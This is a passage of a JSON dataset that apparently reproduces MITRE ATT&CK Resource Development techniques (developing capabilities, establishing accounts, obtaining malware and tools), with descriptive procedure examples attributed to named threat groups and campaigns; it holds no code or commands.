                        "Description": "<name> has compromised small office and home office (SOHO) network edge devices, many of which were located in the same geographic area as the victim, to proxy network traffic.[7][8]"
                    }
                }
            }
        },
        "tactic": "Resource Development",
        "description": "Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, network devices, and third-party web and DNS services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle.[1][2][3][4] Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.Use of compromised infrastructure allows adversaries to stage, launch, and execute operations. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. For example, adversaries may leverage compromised infrastructure (potentially also in conjunction with Digital Certificates) to further blend in and support staged information gathering and/or Phishing campaigns.[5] Additionally, adversaries may also compromise infrastructure to support Proxy and/or proxyware services.[6][7]By using compromised infrastructure, adversaries may make it difficult to tie their actions back to them. Prior to targeting, adversaries may compromise the infrastructure of other adversaries.[8]",
        "Procedure": {}
    },
    "T1587": {
        "ttp_name": "Develop Capabilities",
        "ttp_id": "T1587",
        "href": "/techniques/T1587",
        "subtechnique": {
            "001": {
                "name": "Malware",
                "href": "/techniques/T1587/001",
                "description": "Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.[1][2][3][4]As with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.Some aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of Web Services.[5]",
                "Procedure": {
                    "G1007": {
                        "ID": "G1007",
                        "Name": "Aoqin Dragon",
                        "Description": "<name> has used custom malware, including Mongall and Heyoka Backdoor, in their operations.[6]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has used unique malware in many of their operations.[7][8][9][10]"
                    },
                    "C0010": {
                        "ID": "C0010",
                        "Name": "C0010",
                        "Description": "For <name>, UNC3890 actors used unique malware, including SUGARUSH and SUGARDUMP.[11]"
                    },
                    "G0003": {
                        "ID": "G0003",
                        "Name": "Cleaver",
                        "Description": "<name> has created customized tools and payloads for functions including ARP poisoning, encryption, credential dumping, ASP.NET shells, web backdoors, process enumeration, WMI querying, HTTP and SMB communications, network interface sniffing, and keystroke logging.[12]"
                    },
                    "C0004": {
                        "ID": "C0004",
                        "Name": "CostaRicto",
                        "Description": "For <name>, the threat actors used custom malware, including PS1, CostaBricks, and SombRAT.[13]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has utilized custom malware to maintain persistence in a compromised environment.[14][15]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> has developed malware for use in operations, including the creation of infected removable media.[4][16]"
                    },
                    "G0119": {
                        "ID": "G0119",
                        "Name": "Indrik Spider",
                        "Description": "<name> has developed malware for their operations, including ransomware such as BitPaymer and WastedLocker.[17]"
                    },
                    "G0004": {
                        "ID": "G0004",
                        "Name": "Ke3chang",
                        "Description": "<name> has developed custom malware that allowed them to maintain persistence on victim networks.[18]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has developed its own unique malware such as MailFetch.py for use in operations.[19][20]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has developed custom malware for use in their operations.[21][22]"
                    },
                    "G1014": {
                        "ID": "G1014",
                        "Name": "LuminousMoth",
                        "Description": "<name> has used unique malware for information theft and exfiltration.[23][24]"
                    },
                    "G1009": {
                        "ID": "G1009",
                        "Name": "Moses Staff",
                        "Description": "<name> has built malware, such as DCSrv and PyDCrypt, for targeting victims' machines.[25]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "For <name>, Lazarus Group developed custom tools such as Sumarta, DBLL Dropper, Torisma, and DRATzarus for their operations.[26][27][28][29]"
                    },
                    "C0023": {
                        "ID": "C0023",
                        "Name": "Operation Ghost",
                        "Description": "For <name>, APT29 used new strains of malware including FatDuke, MiniDuke, RegDuke, and PolyglotDuke.[30]"
                    },
                    "C0013": {
                        "ID": "C0013",
                        "Name": "Operation Sharpshooter",
                        "Description": "For <name>, the threat actors used the Rising Sun modular backdoor.[31]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors developed their own custom webshells to upload to compromised servers.[32]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has developed malware for its operations, including malicious mobile applications and destructive malware such as NotPetya and Olympic Destroyer.[33]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "For the <name>, APT29 used numerous pieces of malware that were likely developed for or by the group, including SUNBURST, SUNSPOT, Raindrop, and TEARDROP.[34][35][36]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has developed custom malware such as Hildegard.[37]"
                    },
                    "C0030": {
                        "ID": "C0030",
                        "Name": "Triton Safety Instrumented System Attack",
                        "Description": "In the <name>, TEMP.Veles developed, prior to the attack, malware capabilities that would require access to specific and specialized hardware and software.[38]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has developed its own unique malware for use in operations.[39]"
                    }
                }
            },
            "002": {
                "name": "Code Signing Certificates",
                "href": "/techniques/T1587/002",
                "description": "Adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.[1] Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.Prior to Code Signing, adversaries may develop self-signed code signing certificates for use in operations.",
                "Procedure": {
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group digitally signed their malware and the dbxcli utility.[2]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "<name> has created self-signed certificates from fictitious and spoofed legitimate software companies that were later used to sign malware.[3]"
                    },
                    "G0056": {
                        "ID": "G0056",
                        "Name": "PROMETHIUM",
                        "Description": "<name> has created self-signed certificates to sign malicious installers.[4]"
                    }
                }
            },
            "003": {
                "name": "Digital Certificates",
                "href": "/techniques/T1587/003",
                "description": "Adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).Adversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: Asymmetric Cryptography with Web Protocols) or even enabling Adversary-in-the-Middle if added to the root of trust (i.e. Install Root Certificate).After creating a digital certificate, an adversary may then install that certificate (see Install Digital Certificate) on infrastructure under their control.",
                "Procedure": {
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has created self-signed digital certificates to enable mutual TLS authentication for malware.[1][2]"
                    },
                    "C0011": {
                        "ID": "C0011",
                        "Name": "C0011",
                        "Description": "For <name>, Transparent Tribe established SSL certificates on the typo-squatted domains the group registered.[3]"
                    },
                    "G0056": {
                        "ID": "G0056",
                        "Name": "PROMETHIUM",
                        "Description": "<name> has created self-signed digital certificates for use in HTTPS C2 traffic.[4]"
                    }
                }
            },
            "004": {
                "name": "Exploits",
                "href": "/techniques/T1587/004",
                "description": "Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits.[1] Adversaries may use information acquired via Vulnerabilities to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.[2]As with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.Adversaries may use exploits during various phases of the adversary lifecycle (i.e. Exploit Public-Facing Application, Exploitation for Client Execution, Exploitation for Privilege Escalation, Exploitation for Defense Evasion, Exploitation for Credential Access, Exploitation of Remote Services, and Application or System Exploitation).",
                "Procedure": {}
            }
        },
        "tactic": "Resource Development",
        "description": "Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.[1][2][3][4]As with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.",
        "Procedure": {
            "G0094": {
                "ID": "G0094",
                "Name": "Kimsuky",
                "Description": "malware created and used a mailing toolkit to use in spearphishing attacks.[5]"
            }
        }
    },
    "T1585": {
        "ttp_name": "Establish Accounts",
        "ttp_id": "T1585",
        "href": "/techniques/T1585",
        "subtechnique": {
            "001": {
                "name": "Social Media Accounts",
                "href": "/techniques/T1585/001",
                "description": "Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.[1][2]For operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. Once a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others.[1][2] These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: Spearphishing via Service).",
                "Procedure": {
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has set up Facebook pages in tandem with fake websites.[3]"
                    },
                    "G0003": {
                        "ID": "G0003",
                        "Name": "Cleaver",
                        "Description": "<name> has created fake LinkedIn profiles that included profile photos, details, and connections.[4]"
                    },
                    "G1012": {
                        "ID": "G1012",
                        "Name": "CURIUM",
                        "Description": "<name> has established a network of fictitious social media accounts, including on Facebook and LinkedIn, to establish relationships with victims, often posing as an attractive woman.[5]"
                    },
                    "G1011": {
                        "ID": "G1011",
                        "Name": "EXOTIC LILY",
                        "Description": "<name> has established social media profiles to mimic employees of targeted companies.[6]"
                    },
                    "G0117": {
                        "ID": "G0117",
                        "Name": "Fox Kitten",
                        "Description": "<name> has used a Twitter account to communicate with ransomware victims.[7]"
                    },
                    "G1001": {
                        "ID": "G1001",
                        "Name": "HEXANE",
                        "Description": "<name> has established fraudulent LinkedIn accounts impersonating HR department employees to target potential victims with fake job offers.[8]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has created social media accounts to monitor news and security trends as well as potential targets.[9]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has created new Twitter accounts to conduct social engineering against potential victims.[10]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has created new social media accounts for targeting efforts.[11]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has created fake LinkedIn and other social media accounts to contact targets and convince them--through messages and voice communications--to open malicious links.[12]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "For <name>, Lazarus Group created fake LinkedIn accounts for their targeting efforts.[13][14]"
                    },
                    "C0023": {
                        "ID": "C0023",
                        "Name": "Operation Ghost",
                        "Description": "For <name>, APT29 registered Twitter accounts to host C2 nodes.[15]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has established social media accounts to disseminate victim internal-only documents and other sensitive data.[16]"
                    }
                }
            },
            "002": {
                "name": "Email Accounts",
                "href": "/techniques/T1585/002",
                "description": "Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct Phishing for Information or Phishing.[1] Establishing email accounts may also allow adversaries to abuse free services \u2013 such as trial periods \u2013 to Acquire Infrastructure for follow-on purposes.[2]Adversaries may also take steps to cultivate a persona around the email account, such as through use of Social Media Accounts, to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: Domains).[1]To decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.[3]",
                "Procedure": {
                    "G0006": {
                        "ID": "G0006",
                        "Name": "APT1",
                        "Description": "<name> has created email accounts for later use in social engineering, phishing, and when registering domains.[1]"
                    },
                    "G1011": {
                        "ID": "G1011",
                        "Name": "EXOTIC LILY",
                        "Description": "<name> has created e-mail accounts to spoof targeted organizations.[4]"
                    },
                    "C0007": {
                        "ID": "C0007",
                        "Name": "FunnyDream",
                        "Description": "For <name>, the threat actors likely established an identified email account to register a variety of domains that were used during the campaign.[5]"
                    },
                    "G1001": {
                        "ID": "G1001",
                        "Name": "HEXANE",
                        "Description": "<name> has established email accounts for use in domain registration including for ProtonMail addresses.[6]"
                    },
                    "G0119": {
                        "ID": "G0119",
                        "Name": "Indrik Spider",
                        "Description": "<name> has created email accounts to communicate with their ransomware victims, to include providing payment and decryption details.[7]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has created email accounts for phishing operations.[8]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has created new email accounts for spearphishing operations.[9]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has created new email accounts for targeting efforts.[10]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has established email accounts using fake personas for spearphishing operations.[11][12]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name> has leveraged the legitimate email marketing service SMTP2Go for phishing campaigns.[13]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group created fake email accounts to correspond with fake LinkedIn personas; Lazarus Group also established email accounts to match those of the victim as part of their BEC attempt.[14]"
                    },
                    "C0016": {
                        "ID": "C0016",
                        "Name": "Operation Dust Storm",
                        "Description": "For <name>, the threat actors established email addresses to register domains for their operations.[15]"
                    },
                    "C0006": {
                        "ID": "C0006",
                        "Name": "Operation Honeybee",
                        "Description": "During <name>, attackers created email addresses to register for a free account for a control server used for the implants.[16]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "For <name>, the threat actors registered email accounts to use during the campaign.[17]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has created email accounts that mimic legitimate organizations for its spearphishing operations.[18]"
                    },
                    "G0122": {
                        "ID": "G0122",
                        "Name": "Silent Librarian",
                        "Description": "<name> has established e-mail accounts to receive e-mails forwarded from compromised accounts.[19]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has leveraged ProtonMail email addresses in ransom notes when delivering Ryuk ransomware.[20]"
                    }
                }
            },
            "003": {
                "name": "Cloud Accounts",
                "href": "/techniques/T1585/003",
                "description": "Adversaries may create accounts with cloud providers that can be used during targeting. Adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, MEGA, Microsoft OneDrive, or AWS S3 buckets for Exfiltration to Cloud Storage or to Upload Tools. Cloud accounts can also be used in the acquisition of infrastructure, such as Virtual Private Servers or Serverless infrastructure. Establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.[1]Creating Cloud Accounts may also require adversaries to establish Email Accounts to register with the cloud provider.",
                "Procedure": {}
            }
        },
        "tactic": "Resource Development",
        "description": "Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.[1][2]For operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.[1][2]Establishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for Phishing for Information or Phishing.[3] In addition, establishing accounts may allow adversaries to abuse free services, such as registering for trial periods to Acquire Infrastructure for malicious purposes.[4]",
        "Procedure": {
            "G0025": {
                "ID": "G0025",
                "Name": "APT17",
                "Description": "malware has created and cultivated profile pages in Microsoft TechNet. To make profile pages appear more legitimate, malware has created biographical sections and posted in forum threads.[5]"
            },
            "G0117": {
                "ID": "G0117",
                "Name": "Fox Kitten",
                "Description": "malware has created KeyBase accounts to communicate with ransomware victims.[6][7]"
            }
        }
    },
    "T1588": {
        "ttp_name": "Obtain Capabilities",
        "ttp_id": "T1588",
        "href": "/techniques/T1588",
        "subtechnique": {
            "001": {
                "name": "Malware",
                "href": "/techniques/T1588/001",
                "description": "Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.In addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).",
                "Procedure": {
                    "G0138": {
                        "ID": "G0138",
                        "Name": "Andariel",
                        "Description": "<name> has used a variety of publicly-available remote access Trojans (RATs) for its operations.[1]"
                    },
                    "G0006": {
                        "ID": "G0006",
                        "Name": "APT1",
                        "Description": "<name> used publicly available malware for privilege escalation.[2]"
                    },
                    "G0143": {
                        "ID": "G0143",
                        "Name": "Aquatic Panda",
                        "Description": "<name> has acquired and used njRAT in its operations.[3]"
                    },
                    "G0135": {
                        "ID": "G0135",
                        "Name": "BackdoorDiplomacy",
                        "Description": "<name> has obtained and used leaked malware, including DoublePulsar, EternalBlue, EternalRocks, and EternalSynergy, in its operations.[4]"
                    },
                    "C0015": {
                        "ID": "C0015",
                        "Name": "C0015",
                        "Description": "For <name>, the threat actors used Cobalt Strike and Conti ransomware.[5]"
                    },
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> has acquired and used a variety of malware, including Cobalt Strike.[6]"
                    },
                    "C0007": {
                        "ID": "C0007",
                        "Name": "FunnyDream",
                        "Description": "For <name>, the threat actors used a new backdoor named <name>.[7]"
                    },
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> acquired and used the Redline password stealer in their operations.[8]"
                    },
                    "G0140": {
                        "ID": "G0140",
                        "Name": "LazyScripter",
                        "Description": "<name> has used a variety of open-source remote access Trojans for its operations.[9]"
                    },
                    "G1014": {
                        "ID": "G1014",
                        "Name": "LuminousMoth",
                        "Description": "<name> has obtained and used malware such as Cobalt Strike.[10][11]"
                    },
                    "G1013": {
                        "ID": "G1013",
                        "Name": "Metador",
                        "Description": "<name> has used unique malware in their operations, including metaMain and Mafalda.[12]"
                    },
                    "C0002": {
                        "ID": "C0002",
                        "Name": "Night Dragon",
                        "Description": "During <name>, threat actors used Trojans from underground hacker websites.[13]"
                    },
                    "C0005": {
                        "ID": "C0005",
                        "Name": "Operation Spalax",
                        "Description": "For <name>, the threat actors obtained malware, including Remcos, njRAT, and AsyncRAT.[14]"
                    },
                    "G1018": {
                        "ID": "G1018",
                        "Name": "TA2541",
                        "Description": "<name> has used multiple strains of malware available for purchase on criminal forums or in open-source repositories.[15]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has used malware such as Azorult and Cobalt Strike in their operations.[16]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has used malware obtained after compromising other threat actors, such as OilRig.[17][18]"
                    }
                }
            },
            "002": {
                "name": "Tool",
                "href": "/techniques/T1588/002",
                "description": "Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as Cobalt Strike. Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.[1]Adversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).",
                "Procedure": {
                    "G1007": {
                        "ID": "G1007",
                        "Name": "Aoqin Dragon",
                        "Description": "<name> obtained the Heyoka open source exfiltration tool and subsequently modified it for their operations.[2]"
                    },
                    "G0099": {
                        "ID": "G0099",
                        "Name": "APT-C-36",
                        "Description": "<name> obtained and used a modified variant of Imminent Monitor.[3]"
                    },
                    "G0006": {
                        "ID": "G0006",
                        "Name": "APT1",
                        "Description": "<name> has used various open-source tools for privilege escalation purposes.[4]"
                    },
                    "G0073": {
                        "ID": "G0073",
                        "Name": "APT19",
                        "Description": "<name> has obtained and used publicly-available tools like Empire.[5][6]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has obtained and used open-source tools like Koadic, Mimikatz, and Responder.[7][8][9]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has obtained and used a variety of tools including Mimikatz, SDelete, Tor, meek, and Cobalt Strike.[10][11][12]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has obtained and used tools such as Mimikatz and Cobalt Strike, and a variety of other open-source tools from GitHub.[13][14]"
                    },
                    "G0064": {
                        "ID": "G0064",
                        "Name": "APT33",
                        "Description": "<name> has obtained and leveraged publicly-available tools for early intrusion activities.[15][16]"
                    },
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name> has obtained and used open-source tools such as Mimikatz.[17]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has modified and used customized versions of publicly-available tools like PLINK and Mimikatz.[18][19]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> has obtained and used tools such as Mimikatz, pwdump, PowerSploit, and Windows Credential Editor.[20]"
                    },
                    "G0143": {
                        "ID": "G0143",
                        "Name": "Aquatic Panda",
                        "Description": "<name> has acquired and used Cobalt Strike in its operations.[21]"
                    },
                    "G0135": {
                        "ID": "G0135",
                        "Name": "BackdoorDiplomacy",
                        "Description": "<name> has obtained a variety of open-source reconnaissance and red team tools for discovery and lateral movement.[22]"
                    },
                    "G1002": {
                        "ID": "G1002",
                        "Name": "BITTER",
                        "Description": "<name> has obtained tools such as PuTTY for use in their operations.[23]"
                    },
                    "G0098": {
                        "ID": "G0098",
                        "Name": "BlackTech",
                        "Description": "<name> has obtained and used tools such as Putty, SNScan, and PsExec for its operations.[24]"
                    },
                    "G0108": {
                        "ID": "G0108",
                        "Name": "Blue Mockingbird",
                        "Description": "<name> has obtained and used tools such as Mimikatz.[25]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "<name> has obtained and used open-source tools such as Mimikatz, gsecdump, and Windows Credential Editor.[26]"
                    },
                    "C0010": {
                        "ID": "C0010",
                        "Name": "C0010",
                        "Description": "For <name>, UNC3890 actors obtained multiple publicly-available tools, including METASPLOIT, UNICORN, and NorthStar C2.[27]"
                    },
                    "C0015": {
                        "ID": "C0015",
                        "Name": "C0015",
                        "Description": "For <name>, the threat actors obtained a variety of tools, including AdFind,  AnyDesk, and Process Hacker.[28]"
                    },
                    "C0017": {
                        "ID": "C0017",
                        "Name": "C0017",
                        "Description": "For <name>, APT41 obtained publicly available tools such as YSoSerial.NET, ConfuserEx, and BadPotato.[29]"
                    },
                    "C0018": {
                        "ID": "C0018",
                        "Name": "C0018",
                        "Description": "For <name>, the threat actors acquired a variety of open source tools, including Mimikatz, Sliver, SoftPerfect Network Scanner, AnyDesk, and PDQ Deploy.[30][31]"
                    },
                    "C0021": {
                        "ID": "C0021",
                        "Name": "C0021",
                        "Description": "For <name>, the threat actors used Cobalt Strike configured with a modified variation of the publicly available Pandora Malleable C2 Profile.[32][33]"
                    },
                    "C0027": {
                        "ID": "C0027",
                        "Name": "C0027",
                        "Description": "During <name>, Scattered Spider obtained and used multiple tools including the LINpeas privilege escalation utility, aws_consoler, rsocx reverse proxy, Level RMM tool, and RustScan port scanner.[34]"
                    },
                    "C0032": {
                        "ID": "C0032",
                        "Name": "C0032",
                        "Description": "During the <name> campaign, TEMP.Veles obtained and used tools such as Mimikatz and PsExec.[35]"
                    },
                    "G0008": {
                        "ID": "G0008",
                        "Name": "Carbanak",
                        "Description": "<name> has obtained and used open-source tools such as PsExec and Mimikatz.[36]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has obtained and used tools such as BloodHound, Cobalt Strike, Mimikatz, and PsExec.[37][38]"
                    },
                    "G1021": {
                        "ID": "G1021",
                        "Name": "Cinnamon Tempest",
                        "Description": "<name> has used open-source tools including customized versions of the Iox proxy tool, NPS tunneling tool, Meterpreter, and a keylogger that uploads data to Alibaba cloud storage.[39][40]"
                    },
                    "G0003": {
                        "ID": "G0003",
                        "Name": "Cleaver",
                        "Description": "<name> has obtained and used open-source tools such as PsExec, Windows Credential Editor, and Mimikatz.[41]"
                    },
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> has obtained and used a variety of tools including Mimikatz, PsExec, Cobalt Strike, and SDelete.[42]"
                    },
                    "G0052": {
                        "ID": "G0052",
                        "Name": "CopyKittens",
                        "Description": "<name> has used Metasploit, Empire, and AirVPN for post-exploitation activities.[43][44]"
                    },
                    "C0004": {
                        "ID": "C0004",
                        "Name": "CostaRicto",
                        "Description": "During <name>, the threat actors obtained open source tools to use in their operations.[45]"
                    },
                    "C0029": {
                        "ID": "C0029",
                        "Name": "Cutting Edge",
                        "Description": "During <name>, threat actors leveraged tools including Interactsh to identify vulnerable targets, PySoxy to simultaneously dispatch traffic between multiple endpoints, BusyBox to enable post exploitation activities, and Kubo Injector to inject shared objects into process memory.[46][47]"
                    },
                    "G0079": {
                        "ID": "G0079",
                        "Name": "DarkHydrus",
                        "Description": "<name> has obtained and used tools such as Mimikatz, Empire, and Cobalt Strike.[48]"
                    },
                    "G0105": {
                        "ID": "G0105",
                        "Name": "DarkVishnya",
                        "Description": "<name> has obtained and used tools such as Impacket, Winexe, and PsExec.[49]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has obtained and used tools such as Mimikatz, CrackMapExec, and PsExec.[50]"
                    },
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> has acquired and used a variety of open source tools.[51]"
                    },
                    "G1003": {
                        "ID": "G1003",
                        "Name": "Ember Bear",
                        "Description": "<name> has obtained and used open source scripts from GitHub.[52]"
                    },
                    "G0137": {
                        "ID": "G0137",
                        "Name": "Ferocious Kitten",
                        "Description": "<name> has obtained open source tools for its operations, including JsonCPP and Psiphon.[53]"
                    },
                    "G0051": {
                        "ID": "G0051",
                        "Name": "FIN10",
                        "Description": "<name> has relied on publicly-available software to gain footholds and establish persistence in victim environments.[54]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has utilized publicly available tools such as Mimikatz, Impacket, PWdump7, ProcDump, Nmap, and Incognito V2 for targeting efforts.[55]"
                    },
                    "G0053": {
                        "ID": "G0053",
                        "Name": "FIN5",
                        "Description": "<name> has obtained and used a customized version of PsExec, as well as use other tools such as pwdump, SDelete, and Windows Credential Editor.[56]"
                    },
                    "G0037": {
                        "ID": "G0037",
                        "Name": "FIN6",
                        "Description": "<name> has obtained and used tools such as Mimikatz, Cobalt Strike, and AdFind.[57][58]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> has utilized a variety of tools such as Cobalt Strike, PowerSploit, and the remote management tool, Atera for targeting efforts.[59]"
                    },
                    "G0061": {
                        "ID": "G0061",
                        "Name": "FIN8",
                        "Description": "<name> has used open-source tools such as Impacket for targeting efforts.[60]"
                    },
                    "C0001": {
                        "ID": "C0001",
                        "Name": "Frankenstein",
                        "Description": "For <name>, the threat actors obtained and used Empire.[61]"
                    },
                    "C0007": {
                        "ID": "C0007",
                        "Name": "FunnyDream",
